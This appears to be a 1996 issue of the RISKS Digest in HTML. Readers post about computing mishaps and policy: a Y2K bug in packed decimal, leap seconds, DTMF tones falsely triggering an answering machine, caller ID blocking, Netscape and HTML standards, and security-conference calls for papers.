However, the real question is, how did these machines get registered with
the page?  The answer is, Netscape.  My best guess is that by selecting the
"Who Where?" page, or some other page, automatically registers your machine<BR>
with the database which then fingers your machine for information.  To
test this theory, just look up the entries for "root."  (Which indicates
many more risks, i.e. root running Netscape, et. al.)
<P>
This would be fine if there was a notice that entering this page
automatically registers you (and everyone currently logged onto your
computers) with the database.  However, the page highlights and underlines
the phrase "Add Your Listing" which indicates that it has not been added
already.
<P>
The risks, in the case of skip, are obvious.  However, it was just another
reminder to myself about the propagation of personal information (that
may indeed be inaccurate.)

A brief note of appreciation to Bear Giles (<A HREF="/Risks/17.89.html">RISKS-17.89</A>):
<P>
I had been focussed on Y2K as a technical problem.  At the risk of showing
my age, here's how I lost my innocence.
<P>
Our timesharing mainframe's OS failed on December 1, 1979.  Operations was
able to restart it; it would run a short while and fail again in the
supervisor. I won't mention the OS since we had extensively modified it and
it wouldn't be fair to sully the vendor with our self produced problem.
<P>
The memory dump showed a data exception in our online accounting routine, it
was doing a packed decimal operation on a field that contained the
hexadecimal sequence '000197AF'.  You grey beards (Yes, I have seen *you*,
Mr. Moderator.) out there will recognize the problem.  Even though the field
had the century indicator, our assembly language programmer had chosen to
increment only the year portion.  He extracted the 4 bits, incremented the
year, and stored the year back.  This subroutine worked for years 1970
through 1979 but 197A is not the next year, at least not until we replace
decades with hexadecades.
<P>
(sidebar ALC lesson, of '000197AF', the 'F' means a positive number.  This
representation is packed decimal; the programmer used binary arithmetic
operators on a packed decimal number.)
<P>
This code calculated the billing period, lived in our operating system, and
was executed at the end of each batch job or timesharing logoff.
<P>
A lot of the popular writing on the Y2K problem (I'd been calling it, the
century end problem) has focussed on application data, cobol, database,
accounting, and reporting issues.  These are certainly the larger part of
the problem and the 'suit' consulting companies will have their hands full.
<P>
Because I have seen and debugged an operating system catastrophic failure
caused by a calendar issue, I believe this problem has a darker, more
ominous side.  There are subtle Y2K problems that are not revealed by
scanning the external data.  Some of these problems are implemented in
assembly language.  Some of the assembly language source code has been lost
over the decades.  There are very few of us left who can read and write
machine language.
<P>
Contrary to reports in the popular press, the world does not run on PCs and
client/server systems.  It runs on big water cooled mainframes and a lot of
old, old software maintained by aging staffs.  Each year, a substantial
percentage of the machine language programmers leave this business.
<P>
Who is going to fix the hard problems?

&gt; A leap second is a 61st second in a minute (always just before UT<BR>
&gt; midnight), so ... some date specifications such as "23:59:60 Dec 31<BR>
&gt; 1972" are actually perfectly valid.
<P>
Yep -- but that particular date and time combination is valid only if the
time zone is assumed to be UTC.  In the Newfoundland time zone, for example,
23:59:60 would never be a valid time, but on days with a leap second, one of
20:29:60 or 21:29:60 is valid.  22:29:60 could have been valid too if there
had been a leap second in the summer of 1988 when Newfoundland tried double
daylight saving time, but there wasn't one then.  In other words, true
validation of a time of day requires knowledge of the time zone.
<P>
Of course, this is true anyway even without regard to leap seconds, since
you also need to know about daylight saving time transitions.
<P>
Which reminds me of something instructive -- a few weeks ago, Dafydd Price
Jones (<A HREF="mailto:dafyddpj@dafyddpj.demon.co.uk">dafyddpj@dafyddpj.demon.co.uk</A>) asked in rec.puzzles: "What was the
longest month of 1995 in New York?"  The right answer is October, when
daylight saving time ends.  But there must have been half a dozen readers
who forgot that, remembered the latest leap second, and leaped to post the
wrong answer "December".
<P>
The moral?  Merely what we've been saying already.  Date and time
computations are surprisingly tricky.
<P>
(There was also a wonderful "cook" of the puzzle, with its own Risks<BR>
implications.  Chris Best (<A HREF="mailto:cab@col.hp.com">cab@col.hp.com</A>) said that the longest month
was the only 9-letter one, September!  Peter will remember the time that
comp.risks itself was bitten by a longer-than-average spelled-out date.)
<P>
Joe continues:
<P>
| This has worked reasonably well so far, but I've read predictions<BR>
| that within only a couple of decades we'll first start needing leap<BR>
| seconds every year, then twice a year, then even more and more often...<BR>
| What shall we do then?  Redefine the second?  Keep two separate time<BR>
| standards, one with a fixed second and another with a stretchy second<BR>
| that changes to accommodate the Earth?
<P>
Already done -- those would be TAI and UT1 respectively.  Neither one is
what's used for civil time, though.  Civil time is based on UTC, which is
called *Coordinated* Universal Time precisely because it is derived from
*both* TAI and UT1.  And this is exactly why we have leap seconds.  UTC uses
the fixed-size seconds of TAI, but keeps its time within 900 ms of the
current time according to UT1, by using a leap second (or, as Joe noted, in
theory an anti-leap second) when needed.
<P>
But maybe Joe meant that people would actually need to use both kinds of
seconds in everyday life.  It'll be a *long* time before things come to
that, and I think we can safely defer the problem for now.
<P>
Incidentally, while TAI is an acronym in French, UTC is not; it's in
English, but the C is last because it's effectively a subscript.  Both UT1
and UTC are considered variations of UT, Universal Time; there are others too.

I bought a CD by the hardcore group ``Shelter'' yesterday.  They're a
straight edge (that is, no drugs, alcohol, tobacco, etc) band who are also
quite into Krsna consciousness.
<P>
Track number 11 of this CD is a 5 minute section of Hare Krsna chanting and
music.  I told my girlfriend this, and she thought that it sounded kind of
``interesting.''  So, when I called her up just a second ago and her
answering machine picked up, I thought it would be humorous to play the
chants REALLY loud so that it would be picked up over the phone.  Thinking
that she might be there but just not have answered, I was holding the
receiver to my ear, when to my surprise, I heard the answering machine say,
``enter access code for remote operation...''!
<P>
I was quite amazed, and speculated that the chanting had had some sort of
tone in it that triggered an attempt to use the remote operation facility
present in most modern answering machines.
<P>
The risk?  Things like this go to illustrate how far our modern technical
society has come, and how it has grown in many different directions at once.
It is possible to say that we have advanced to such a point in so many areas
that seemingly innocuous things in one (such as a track of music on a CD)
can trigger *very* unexpected results in another.

Emily Green, of New Jersey, has been called to jury-duty -- but she will
not be serving; she has what is being considered a "valid excuse": She
needs to go to school...  Emily is only 8 years old and, therefore, is not
*eligible* for jury duty...  So why was she even summoned in the first
place?  Because Governor Christine Whitman has banned all automatic
exemptions from jury duty...  [Source: WPVI-TV6, Philadelphia]

The Federal Trade Commission is conducting a "wholesale crackdown" on
perpetrators of allegedly deceptive marketing schemes that are advertised in
Internet news groups or on the World Wide Web.  Charges were filed against
nine individuals or companies accused of misleading the public, and agency
officials say this is only the beginning: "The Internet opens a world of
opportunities for consumers.  Unfortunately, it also presents opportunities
for scam artists.  We intend to monitor the Internet rigorously and act
decisively when we see deceptive and misleading marketing," says the
director of the FTC's Bureau of Consumer Protection.  (*Investor's Business

Iomega, maker of high-capacity removable disk drives, is the focus of
controversy on America Online's Motley Fool bulletin board.  Company
officials have complained to the SEC that postings on Motley Fool and other
BBSs have contained false information and may be contributing to the
volatility of its stock.  Online exposure has "raised the visibility of some
stocks as well as the interest in those stocks," says an outside spokesman
for Iomega.  "At the same time, we're very concerned about how online
services can be used to attempt to drive stock prices higher or lower
through misinformation."  Postings about Iomega escalated to flaming and
physical threats last month, causing Motley Fool to pull some of the more
offensive ones, but critics of online BBSs note Iomega's problems are a
result of the practice of using "screen names" and the lack of verification
of information that's posted.  "You don't know if the person is a Ph.D. or
in Sing Sing," says one critic.  (*Wall Street Journal*, 15 Mar 1996, A5C)

A friend of mine is the general manager of a company called Excalibur that
makes simulators of airline computers.  He was recently sitting with a rep
of a different company that happens to be a co-pilot of 747s.  The guy
wanted to buy some of Excalibur's processor cards to test out the system
they are designing.  What system?  Turning all online airline manuals into
an intelligent information system.  Turns out that each 747 has a shelf of
books the size of telephone books describing what to do and when to do it.
<P>
The pilot was describing that it is constantly being updated by Boeing or by
a specific airline and that it is close to impossible to find anything or
understand anything in these onboard manuals.  As an example, he produced a
page from Northwest Airlines updates to the B-747 Emergency/Abnormal
Procedures when there is a fuel-line blockage (17 Oct 1995, page 2.28.13):
<P>
# 5. Scavenge center tank until empty.<BR>
# If, after the center tank is empty, the NO 2 MAIN tank quantity is greater<BR>
# than the NO 1 MAIN tank quantity plus the NO 1 RES and/or the NO 3 MAIN<BR>
# tank quantity is greater than and NO 4. MAIN tank quantity plus the NO 4<BR>
# RES: Accomplish the "Inboard Dual Boost Pump Failure or Inboard X-Feed<BR>
# Valve Failure Without Center Tank Fuel" procedure in this section.
<P>
The pilot said ``Imagine you are 30,000 feet up and you have a fuel blockage
and the co-pilot starts reading this?''  He said this is a typical type of
page.  The risks are obvious.

There are two aspects of the censorship of the Internet that haven't been
published in the Risks-Forum yet:
<OL>
<LI>Even if most of the material found on the Internet is written in English,
there exists material in other languages. If you are doing a search for
English indecent words, I am pretty sure that you will get hits. But the
word may not be indecent in the foreign language.
(An innocent example: The Swedish for the digit six is "sex".)
<P>
<LI>How much it must hurt the feelings of the inhabitants of the country
who started it all: you can't control the net. It has grown out of the
control of an individual country.

I gave a talk at Sun's Dutch JavaDay last Thursday.  In keeping with the WWW
atmosphere, I presented my slides from HTML pages, and (stupidly) without
notes.  Two unpleasant things happened to me whilst on stage.
When I walked on, the previous speaker handed me a mouse and said
"You will have to plug this in". He had used it to illustrate some of the
basic problems Java has to overcome (1 button vs 3 button mice). Now whilst
you can unplug a mouse from a PC with out much risk, Sparcs (which is what
was sitting in front of me) tend to halt if they lose contact with their
rodent.  Fortunately this one didn't.<P>
The second thing was *much* worse. I was demonstrating an applet
I've written that monitors the status of a UPS. Due to the weight of the UPS
and the security restrictions in Java, I had chosen to leave the UPS in my
office, attached to my Solaris-2.4-on-intel workstation, and also run a web
server there to provide the slides and the application over the live
internet link Sun provided.<P>
So there I was on stage with no notes -- when the next slide refused
to come up. I continued from memory and my colleague in the audience called
back to the office to see what had happened. It was quickly fixed, and my
talk finished ok -- but having aged me considerably.<P>
So, what had happened? One of my colleagues was looking for a PC to
do some windows work, and seeing my unoccupied work place decided to
shutdown Solaris and reboot it into windows.
Conclusions:
<OL>
<LI> buy post-it-notes and write "Keep off - beware of the OG" on them
next time.<BR>
<LI>People who work with PC's assume that all computers behave the same way.

PacBell will allow you to do `complete blocking' of caller ID for *free* --
but you have to call 1 (800) 298-5000 and specifically request this.  You
also have to listen to this 2-3 minute canned speech extolling the virtues
of caller ID before they'll let you get complete blocking.  This number
supposedly works 24 hours/day, 7 days/week.
<P>
It's very irritating that `complete blocking' wasn't made the default, but
perhaps these telecom dinosaurs will learn a lesson if most people sign up
for complete blocking.  Due to the number of busy signals, I gather that
a lot of people aren't interested in caller ID.
<P>
BTW, even if you have `complete blocking', I think that you can make your
ID available on a per-call basis by predialing `*82' before the number.
I understand that even complete blocking does not block (800), (900) and
976- ID's.  To do that, you have to call one of these `remailer'-type
services, which charge you something like $3/minute.

Both Mr. Mayer-Schoenberger's original message as well as the response by
Messers. Strassmann/Marlow point to an obvious, but often forgotten, risk
regarding information on the Internet: Namely, the propensity to take
anything posted or submitted at face-value and to trust someone else's words
and report explicitly.  (If we want to be truly cynical and doubting
Thomases, we could also ask if e-mail from Dorothy Denning can be relied on
to be Strassmann/Marlow's actual thoughts.  I have no doubt, however, that
our moderator did some checking of his own to ensure reliability.)  Simply
put, even in the absence of deliberate misrepresentation, any statement made
on the net is subject to a certain degree of human bias.

Welcome to the computer industry.  Companies with a large market share in a
particular area are always apt to ignore the "recognized" standardization
process and implement features which are (a) great for their product, and
(b) probably hard to duplicate in other products.
<P>
When applied to operating systems, APIs, and protocols, this can lead to
serious problems, especially when those features are "proprietary".
Need I cite examples?
<UL>
<LI>Microsoft's Win32 API, which, interestingly enough, is being pushed
through the ISO standardization process (against Microsoft's wishes).
<LI>All commercial versions of UNIX.
<LI>JavaScript.
<LI>Computer hardware, processor, and bus design, especially those systems
for which NDA's must be signed to get programming specifications.
</UL>
All this amounts to is that "standards" are only as good as the
company-centric market in which they are derived. Jonathan says that the
HTML standardization process is "recognized" --- recognized by whom?
Certainly not Netscape.

While I do not particularly care for the way Netscape and its creators<BR>
treat syntax errors, Jonathan goes much too far in his condemnation.  In my
view a standard is a set of minimum requirements.  There are many situations
when a designer may want to go beyond the standard.  As long as the person
responsible for the design is aware the the standard is being broached, and
what the consequence of that departure from the standard are, and is willing
to take responsibility for those consequences, that person should be allowed
to do what he or she wants.<P>
However, the existence of Netscape's or any other extensions to the HTML
standard should NOT be subject to debate.  Without an ability to try new
things, a standard becomes an inescapable cage, and that which is confined
to the cage will eventually die of starvation.<P>
Jonathan, in condemning the Netscape extensions, is attacking the
wrong problem.  If he did succeed in getting what he wanted, we would all
loose by it.
<P>
On the other hand, the creators of Netscape must recognize that it is
one of the tools, and sometimes the only tool other than a simple text editor,
used to design web pages and has to provide a mode where departures from the
standard can be flagged.  While I am not positive what the consequence of a
failure to provide such a flag will be, I suspect that Netscape will loose
some market share to any decent browser that does provide such a capability.

<P>
INVITATION
<P>
The Privacy and Security Working Group (PSWG) of the Federal Networking
Council (FNC) and the Research Program on Communications Policy of the
Center for Technology, Policy, and Industrial Development at the
Massachusetts Institute of Technology will hold an invitational workshop at
the Haystack Observatory outside of Boston, MA, on May 20-21, 1996. This
workshop is intended to bring Federal, academic and private sector
participants together in collaboration to develop strategies and potential
solutions related to Internet privacy and security.
<P>
Though a principal focus of the workshop will be on the Federal portion of
the Internet, the FNC recognizes that the Federal Internet is tightly
coupled with the Global Internet, whose security policies, practices, and
goals are complementary to those of the Federal Government. To define those
practices, procedures and goals, the PSWG has undertaken two major
initiatives:
<UL>
<LI>The Federal Internet Security Plan (FISP), which was developed as a
scalable, continual improvement process, based on common principles<BR>
and mechanisms compatible with Internet community values and needs; and
<P>
<LI>The Collaborations in Internet Security (CIS) project, an effort aimed
at testing the strength of agency approaches to security and moving these<BR>
technologies beyond individual agency networking environments and into<BR>
both inter-agency and agency-commercial sector communications. The CIS<BR>
will result in the development of a new and sustainable process for<BR>
developing, integrating, and deploying security technologies that are<BR>
interoperable at all levels of the Federal government and within the<BR>
commercial and academic sectors.
</UL>
These initiatives are intended to highlight the critical interface between
Federal and commercial users and developers of Internet services and
technologies.
<P>
OBJECTIVES
<P>
This workshop will bring together principal players in the Federal
and overall Internet community to discuss the problems and
challenges of privacy and security on the Internet, and will:
<UL>
<LI>Identify critical issues, requirements, and recommendations related 
to future Internet privacy and security research and development efforts;
<P>
<LI>Describe "best practice" approaches to Internet privacy and security;
<P>
<LI>Develop specific strategies for implementing Internet Security programs
involving all sectors of the Internet community;
<P>
<LI>Extend the Federal Internet Security Plan (FISP) by defining specific 
implementations; and finally,
<P>
<LI>Develop specific strategies for the migration of technologies from the
individual RFC unit test stage to the integration of a complete functional<BR>
managed system in the CIS test/demonstration/pilot projects.
</UL>
SUBMISSIONS
<P>
Abstracts or complete paper drafts related to the topics listed
above are welcome.  Accepted papers will be a part of the published
record of the workshop.  All points of view on Federal policies
affecting Internet privacy and security are welcome. Please make
all electronic submissions in ASCII format.

BACKGROUND
<P>
Federal Internet Security Plan: In September 1995, the PSWG published the
draft Federal Internet Security Plan (FISP).  The FISP is oriented toward a
scalable, continual improvement process, based on common principles and
mechanisms compatible with Internet community values and needs.  See
&lt;<A HREF="http://www.fnc.gov/SWG.html">http://www.fnc.gov/SWG.html</A>&gt;.  The plan addresses Internet security<BR>
requirements, including interoperability, from the perspective of the goals
and objectives outlined in the National Performance Review (NPR),
<A HREF="http://www.npr.gov/">http://www.npr.gov/</A>.  The Federal Networking Council developed this
framework in conjunction with its Advisory Committee which represents
industry, academia, and non-profit sectors.
<P>

</UL>
Collaborations in Internet Security: With the Federal government's
ever-increasing dependency on computers and distributed systems, there is
great urgency for it to develop and employ enhanced information system
security technologies and practices. At the same time, these Federal
technologies must interoperate with those of the broader Internet community
(encompassing the private and academic sectors, along with the Federal
sector).
<P>
In recognition of these needs, the Federal Networking Council's Privacy &amp;
Security Working Group (FNC/PSWG) has been awarded a National Performance
Review (NPR) Innovation Fund grant to compare and validate agency approaches
to security. This Collaborations in Internet Security (CIS) project aims to
test the strength of these technologies beyond individual agency networking
environments, emphasizing the inter-agency and agency-commercial sector
communications. The CIS will result in the development of a new and
sustainable process for developing, integrating, and deploying security
technology that is interoperable at all levels of the Federal Government and
within the commercial and academic sectors.
<P>
The governing principles behind the Security Testbeds include: employment of
an open process (with the activities and results open to participation and
comment by both public and private sector participants); a focus on
multivendor technologies; an emphasis on testing and experimentally
deploying security technologies emerging from research and private sectors
as well as security technologies currently in use in the commercial
environment; and an underlying objective to ensure interoperability among
the broad Internet community (federal, private, and academic). Initial tests
will include demonstrations of Kerberos v.5, testing of single-use
passwords, and digital signatures.  For more information, please see

(Classes I, II and III)
</UL>
We are seeking forward-thinking papers, demonstrations and interactive
concepts for presentation to an audience of 1000+, representing civilian and
military from more than 20 countries, all branches of the US government and
the top US corporations.
<P>
The papers should offer new perspectives, attitudes, studies, and
technologies that can be used for the advancement of the field. You are free
to submit on any subject matter, including, but not limited to:
<UL>
<LI>Battlefield Dominance
<LI>Industrial Espionage: cases, policies and defense.
<LI>Military perspectives on "Information in Warfare"
<LI>Policy Quagmires - Policy Resolutions
<LI>Personal Privacy in the global marketplace
<LI>Denial of Service techniques and technologies for the private sector
and the military
<LI>Terrorism and Counter-terrorism
<LI>Defending Against the Internet: new techniques and methods
<LI>Threats to Global Electronic Commerce and Solutions
<LI>Anonymous International Banking

<P>
On 9 March, an unidentified user posted a message concerning backdoors,
bugs, and Oracle7.  He mentioned a specific (security-relevant) bug that he
had reported through Oracle's normal bug reporting mechanisms and which
Oracle has subsequently fixed.
<P>
It is general - and prudent - security practice not to publish details of
security-relevant bugs, in order to protect exposed systems from potential
attack. In his rush to expose `backdoors and bugs,' The unidentified user
has irresponsibly put other Oracle7 customers - who may not have had a
chance to upgrade - at risk, while his systems are, of course, protected.
<P>
(As a sidebar, many of his other comments were inaccurate - but a<BR>
discussion of the reasons for this properly belongs on<BR>
comp.databases.oracle rather than this forum.)
<P>
The RISK? That users who think they know a little about security can, by
posting before thinking, create or magnify the threat they are allegedly
trumpeting against.

<P>
I recently got a call from a friend where I used to work (The MITRE
Corporation).  MITRE recently "re-engineered" their financial systems.  It
turns out that these "new and improved" systems mis-printed the W2 forms
(U.S. tax form showing earnings and tax withholdings.  Up here in Canada we
call it a T-4 form, eh?)  The employer ID number was printed incorrectly.
It should start with a leading zero, but this zero was suppressed, leaving
the employer ID with the wrong number of digits.
<P>
MITRE made a quiet announcement about this problem in its weekly news
bulletin, and it was only through a phone call from a friend still there
that I found out about this problem.
<P>
My mother recently had a problem with a IRS 1099, which mistakenly reported
tax-exempt interest income as taxable.  She was lucky to catch the mistake.
Otherwise, she would have received a dunning letter from the IRS assessing
taxes and penalties and requiring lots of back-and-forth to rectify the
mistake.  (Been there, done that...)
<P>
The MITRE incident raises two questions, one technical and one social.
<P>
Technically, the problem with the mis-printed number is the distinction
between "radix numbers" (e.g. Federal Employer ID number, Social Security
Number) which are required to have a fixed number of digits, and where the
leading zero is significant, and "cardinal numbers", where the leading zero
can (and usually should) be suppressed.  Of course, COBOL gets this exactly
right, with two different format strings (9 and Z).  But other languages
don't make this clear distinction, and I suspect that the MITRE system was
not written in COBOL...  (I shudder to think what it WAS written in.  There
are lots of horror stories about the failure of this system...)
<P>
The other issue concerns the employer's responsibility to report errors on
computer-generated forms, to both the IRS and to the former employee.  I
think that publishing a "by-the-way" notice in the company newsletter is NOT
a sufficient response to errors on a legal document.  (If anyone thinks that
a W2 is not a legal document, good luck arguing this with the IRS!)
<P>
The unfortunate thing about computers is that it's so easy to replicate
mistakes.  (Reminds me of the ``Dear Rich Bastard'' letters...)

As I sat reading the latest RISKS, the local Radio Station here announced
that their computer is down, so they won't be playing any advertisements --
just music all afternoon.  Apparently all the adverts are now kept as
digitised files on the computer rather than on "carts" as they formerly
were.  I'm sure there's a "risk" in this story somewhere, but I'm not
exactly sure what it is.
<BLOCKQUOTE><I>
[Count your blessings, not your adverts
But it is amazing that they could not ``Ad lib''!
Most stations keep manual backup copies or readable hardcopies
for just such situations -- they hate to lose ad revenue.
But, I hope this outage was not blamed on a home-grown
compiler, so that we can conclude that
``The key, we see, is not the KiWi-C.''  PGN]

<P>
Has anyone else been surprised by an FTP server, when it denies access
because of too many users, affirming that the user-count isn't a bug?
<P>
For example, the ftp.adobe.com site gives the following message:
# Sorry, there are too many anonymous FTP users<BR>
#   using ftp.adobe.com at this time.<BR>
# There is currently a limit of 90 anonymous users.<BR>
# This message is not the result of a bug.
<P>
What is the purpose of the last line?  I can't imagine that it's actually
somehow checking number of users in more than one way, and only generating
the "not a bug" comment when both methods match (and therefore generating a
"this might be a bug" message if there's a discrepancy).  All I can think of
is that someone once reported a bug which turned out not to be a bug and the
comment was put there to prevent more non-bug reports when the server's busy.
<P>
The risks are somewhat obvious, although minor.  If there *is* a bug, it'll
take longer to find and fix, because it's clearly labelled "not a bug", so
it won't get reported as soon or often.  I think there's also a risk in the
programmer attitude that erroneous bug reports can be best prevented by such

<P>
Here I am, watching the Discovery Channel.  There's this show called
"Invention", which has this interesting story about Automated Teller
Machines.  On the show they have the Scottish inventor of the ATM, Shephard
Barron (I probably have the spelling wrong).  They go and introduce him and
show him walking down the street of his home town, and him walking up to an
ATM and in plain sight you see him insert his card and TYPE IN HIS PIN!
If that weren't ironic enough, later on in the story you hear him
talk about how he had some buddies at MI6 try to break the system.  (they
couldn't)
You also got to see at least one other "person off the street"
demonstrate the ATM and his poor PIN is seen typed in in plain view.  (in
closeup this time!)
The risk?  Shows like this only reinforce people's ignorance of how
important it is to keep PINs private.

I am having a really difficult time working up much sympathy for the folks
who complained in RISKS about the html "mailto:" code getting triggered:
Netscape 2.0's security flaws have been widely noted.  But I find it very
interesting that RISKS readers, who ought to know better, are still using a
browser with known security problems.  (Netscape 2.01, which has been out
for a week or so, has plugged this particular hole, and allows you to turn
off Javascript altogether).
<P>
For all the complaints decrying the ignorance of "those people out there
still running unsecure sendmail, etc.", we find that even those that "know
better" still do the same thing.  Of course, like the majority of drivers
who think that they are the minority of very good drivers, RISKS readers
probably think that "they know what they are doing".

<P>
On March 27-30, MIT (and its Laboratory for Computer Science, together with
the World Wide Web Consortium) will host the Sixth Conference on Computers
Freedom and Privacy (CFP).  Since its inception in 1991, the series of CFP
conferences has been the premiere forum for exploring the implications of
computer and telecommunication technologies for privacy and civil liberties.
This year's conference brings together international experts from the fields
of computer science, law, business, public policy, law enforcement, and
government to confront controversial issues that have dominated public
discussions of computer communications policy over the past year.
<P>
Highlights of the conference include
<UL>
<LI>The Constitutional challenge to the Communications Decency Act. Computer
companies, internet service providers, publishing and library associations,
and civil liberties groups have filed suit in Federal court to overturn the
Communications Decency Act of 1996 on the grounds that it violates the First
Amendment.  A judgment is expected in April.  One basis for the challenge is
the existence of less restrictive means to protect children from indecent
material on-line, including filtering software developed at the MIT Lab for
Computer Science.  At the conference, lawyers involved in the ongoing suit
will discuss the progress of the suit and analyze the Constitutional
arguments raised in briefs by the challengers and by the Department of
Justice.
<P>
<LI>Limiting on-line speech on campus.  Harvard Law School's Arthur Miller
will moderate a panel of university administrators, lawyers, and journalists
to explore the conflicts between universities and the free-speech rights of
their students.
<P>
<LI>Can the US government outlaw unauthorized encryption?  In cooperation with
the Criminal Justice Section of the American Bar Association, the conference
will present a moot Court hearing on the Constitutionality of a proposed law
that criminalizes the use of encryption methods that have not been
authorized by the government.  The arguments, which pit former federal
prosecutors against noted civil liberties lawyers, will be conducted before
a distinguished panel of federal appellate and district court judges.
<P>
<LI>China and the Internet.  The Chinese expression "may you live in
interesting times" clearly applies to issues of computers and society as the
Internet spreads explosively throughout China and the rest of Asia.
Sociologist Gary Marx and a panel that includes officials of the China
Education and Research Network (CERNET) discuss the likely social impacts of
the Internet on China.
<P>
<LI>Export-controlled encryption software on the Internet.  Jeff Schiller,
Manager of the MIT Network, and Ron Lee, General Counsel of the National
Security Agency, will describe the legal and technical procedures to be
followed in distributing software over the Internet in compliance with US
export controls.
<P>
<LI>FBI/DOJ law-enforcement training on computer crime.  On the afternoon of
March 27th, Peter Toren of the US Department of Justice Computer Crime Unit
and Richard Ress, Head of the FBI's National Computer Crime Squad, will run
a training session devoted to crime and law in cyberspace.  Admission to
this tutorial will be free for law-enforcement personnel, so long as they
pre-register.  (Qualified law-enforcement personnel should phone
617/253-1700 for information.)
<P>
<LI>George Metakides, Director of Research and Development in Information
Technologies for the European Union, will present a keynote address on
Freedom and Privacy in the Information Age: A European Perspective.
<P>
<LI>Michael Dertouzos, Director of the MIT Laboratory for Computer Science,
will deliver a banquet speech on "Ancient Humans in the Information Age".
<P>
<LI>A free-admission, all-day "Technology Fair" on March 27 will include
hands-on demonstrations of computer technologies affecting freedom and
privacy.
<P>
<LI>Noted privacy advocate Marc Rotenberg and a panel of international experts
will discuss the roles of governments and technology in dealing with data
privacy in the Global Information Infrastructure.
<P>
<LI>What policies and regulations are under consideration for the
international control of cryptography?  How does a multinational company
meet those requirements?  How do we resolve tensions between countries,
between governments and industries, and between governments and popular
groups?  Dorothy Denning of Georgetown University, Deborah Hurley of the
OECD, Chairman David Herson of the European Commission's Senior Advisor
Group on Information Systems, Nick Mansfield of Shell, and White House
Special Assistant on Information Technology Mike Nelson examine the issues.
<P>
<LI>The struggle to control controversial content on the Internet is being
waged in the the US Congress and in open and restrictive societies around
the world.  Will conflicts among governments over what and how to censor
restrict the flow of ideas for all?  Moderator Danny Weitzner of the
Washington-based Center for Democracy and Technology and an international
panel will offer their views.
<P>
<LI>Representatives of business, banking, and law enforcement look at the
future of Electronic Money.  Should on-line payments be anonymous or
traceable?  David Chaum of DigiCash, the American Bankers Association's
Kawika Daguio, and Stan Morris of the Financial Crimes Enforcement Network
(FINCEN) will compare different perspectives.
<P>
<LI>Will copyright law be an enabler of freedom of expression in digital
networked environments or will it be an impediment to free speech?  Does
digitizing information so fundamentally change the economics of creating and
disseminating information products as to render copyright law obsolete?
Pamela Samuelson of Cornell Law School will explore this topic with and
international panel of copyright experts.
<P>
<LI>Science fiction authors Pat Cadigan, Tom Maddox, Bruce Sterling, and
Vernor Vinge will present their unique perspectives on the future of freedom
and privacy in an increasingly computerized world.

&gt; Emily is only 8 years old and, therefore, is not *eligible* for jury duty...
<P>
I'm guessing there's more to it than this.  As far as I know, all potential
juror names are pulled from some known pool.  Traditionally, the list of
registered voters was used.  Some areas are now using lists of licensed
drivers.  Either pool would yield people of the proper age.  The last time I
served at the county level here in Pennsylvania I was pulled from the list
of registered voters.  However, we were told that licensed drivers would be
used in the near future to get a larger pool and not discourage people from
voting to avoid their "other" civic duty.  I don't know if this sort of
decision is typically made at the state or local level.

This is speculative and misleading.  No one has demonstrated that online
discussion influences the price of a stock.  Companies often complain to the
SEC about alleged manipulation; such complaints, in my experience, are
usually spurious, as there are no adverse consequences to the company from
making unfounded claims.

Concerning the attempt to record Hare Krishna chants on a telephone
answering machine...
<P>
When Ma Bell invented touch tone dialing it was quite reasonable to choose
frequencies that fall within the range of the human voice -- after all, all
the equipment was and still is optimized for that range.  It was many years
before anyone tried detecting these "DTMF" tones in a context where a person
would be speaking.  It is difficult to avoid false detection of DTMF tones
in human speech.  Of course, if the telephone answering machine industry had
waited around for the development of "out of band" signalling systems such
as ISDN, a multi-billion dollar industry would never have gotten off the
ground.

<P>
Voice activation of tone-detection equipment is a long standing issue with
voice mail/answering machine systems.  The problem has been significantly
alleviated by the transition from analog circuitry to digital signal
analysis, but some voices still register as one or another DTMF signal.
Fortunately, digital signal analysis has eliminated the far more annoying
problem of the recorded message triggering tone detection when it is played
back.  If the expected signal may be both quite brief and the margin of
error is wide (to accommodate some PBX systems which generate fixed length
and remarkably dirty tones), a wide variety of voices may cause a problem.
<P>
For the record, my answering machine thinks that Lisa Kudrow and Chrissie
Hynde singing harmony on "Smelly Cat" sounds like a DTMF * (end-of-message
indicator).  Or maybe it just has taste...

<I>Wed, 20 Mar 96 12:23:02 PST</I>
<P>
The Computer Security Institute invites you to submit an abstract of a
proposed topic to be considered for presentation at the 1996 23nd Annual
Computer Security Conference, November 11-13, in Chicago.
<P>
We are looking for presentations on the following possible topics: access
control, electronic commerce, remote access security, Internet,
cryptography, risk management, business continuity planning, security
awareness, telecommunications security, network architecture, wireless
network security, LANs, WANs, management issues, network viruses,
client/server systems, single sign-on, imaging, privacy issues and e-mail.
<P>
We are particularly interested in case studies -- in-depth practical
discussions of network-related security projects, problems, and solutions
for the real world.
<P>
Next year's conference will offer approximately 120 scheduled sessions.
Faculty are intended to address a broad range of experiences, expertise and
interest in networks and related security issues. Sessions generally run one
hour and fifteen minutes. Double sessions are scheduled if warranted by the
topic. If your abstract is selected, you are required to provide a paper for
inclusion in the proceedings.
<P>
Applicability to Attendees
The proposed presentation should offer successful concepts, models, processes
and applications useful to those responsible for information security.
<P>
Innovation/Originality
A presentation that advances existing or presents new ideas is better than a
presentation that merely repeats information already widely known. The
timeliness of ideas is important. A presentation designed to sell a name
product or service will be rejected. A presentation should focus on the
general attributions, benefits and drawbacks of a given application or tool.
<P>
Some general guidelines
Courses that offer tips and techniques to increase productivity, in addition
to theory, are much more valuable. Sessions on novel and unique applications
of products and tools are good but keep in mind that emphasis on a single
product can limit the scope of appeal for the class. Case studies of
computer security projects, problems and solutions are very popular.
<P>
To ensure a wide variety of perspectives, no more than three principal
speakers per organization will be allowed to present at the conference.
Papers presented at other computer security conferences will be disqualified
unless they contain substantial new or updated information.
<P>
The Submission Process
To be eligible for selection as a speaker, you will need to submit an
abstract that describes the content of your talk(s), a biography that
describes your background, and complete contact information including your
e-mail address and fax numbers. We must receive your submissions by April
15, 1996 to be considered. Please include any scheduling conflicts you have<BR>
as well.
<P>
The abstract should be approximately 200-300 words (8-10 sentences), and
classified by the presenter as entry-level, intermediate or advanced. Please
provide 3-6 "bullet points" telling us what attendees will learn from your
session. Indicate any special prerequisite knowledge required of
participants and emphasize what attendees will learn.
<P>
We prefer to receive submissions electronically. E-mail should be sent to
prapalus @mfi.com. Upload to the CSI BBS at 415/905-2480.  Abstracts can
also be mailed to CSI, 600 Harrison St. San Francisco, CA 94107 or faxed to
415-905- 2218. For more information, please call Patrice Rapalus at<BR>
415-905-2310.
<P>
Speakers receive complimentary registration for the 2-1/2 day conference and
attendance at all lunches and receptions.

